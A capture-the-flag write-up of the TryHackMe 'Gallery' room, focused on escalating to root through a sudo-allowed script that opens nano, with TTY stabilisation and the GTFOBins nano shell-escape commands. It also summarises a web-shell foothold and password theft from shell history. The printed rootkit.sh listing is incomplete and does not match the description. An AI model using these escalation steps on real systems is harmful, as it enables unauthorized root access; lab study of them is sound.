# THM Gallery (666)

https://tryhackme.com/room/gallery666

A Linux box running **Simple Image Gallery System**, exploited with a public login-bypass + shell-upload exploit for a `www-data` shell. Privilege escalation chains a password found in a shell-history file (to user `mike`), then abuses a `sudo`-allowed `rootkit.sh` that opens `nano` as root (GTFOBins) for a root shell.

## 4. Privilege Escalation #2 — `sudo rootkit.sh` → nano → root

Check `mike`'s sudo rights:

```
mike@ip-10-49-145-153:~$ sudo -l
sudo -l
Matching Defaults entries for mike on ip-10-49-145-153:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on ip-10-49-145-153:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
```

Read the script:

```
mike@ip-10-49-145-153:~$ cat /opt/rootkit.sh
cat /opt/rootkit.sh
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;

        /usr/bin/rkhunter --update;;

```

The `read` option opens `/root/report.txt` in **nano as root** — and nano can spawn a shell (GTFOBins).

### Walkthrough + troubleshooting

> At this point, I got excited and started what I thought would be the last stage by running `rootkit.sh` and choosing the "read" option.
>
> And there is the error. It seems like my shell isn't stable enough to run nano. Therefore, I follow steps 2 and 3 of the Netcat Shell Stabilization tutorial. I first run:
> ```
> export TERM=xterm
> ```
> This is enough to run nano, but doesn't allow me to execute any commands within it. So I background the shell with `Ctrl+Z` and run:
> ```
> stty raw -echo;fg
> ```
> The pointer seems to be hanging in the middle of the screen, so I run `id` and I'm back to normal.
>
> I repeat the steps above and run `rootkit.sh` again. Finally, I'm able to open `report.txt` in nano and, within it, run these commands (per GTFOBins):
> ```
> ^R^X
> reset; sh 1>&0 2>&0
> ```
> I clear the screen and I am **root**! I look around and find the root flag under `/root`.

## Lessons Learned

- **A distinctive web app title (`Simple Image Gallery System`) on a non-standard port** points straight to its public exploit (ExploitDB 50214: login bypass + shell upload).
- **The uploaded web shell takes a `cmd=` parameter** — swap `whoami` for a URL-encoded reverse shell to get an interactive foothold.
- **Read shell-history files (`~/.*history`).** A password was typed inline after `sudo -l`, exposing `mike`'s creds.
- **`sudo`-allowed scripts that call editors are GTFOBins gold.** `rootkit.sh`'s `read` branch runs `nano /root/report.txt` as root; inside nano, `^R^X` → `reset; sh 1>&0 2>&0` spawns a root shell.
- **Stabilise the TTY (`export TERM=xterm`, `stty raw -echo; fg`) before running full-screen programs like nano** — an unstable shell breaks them.
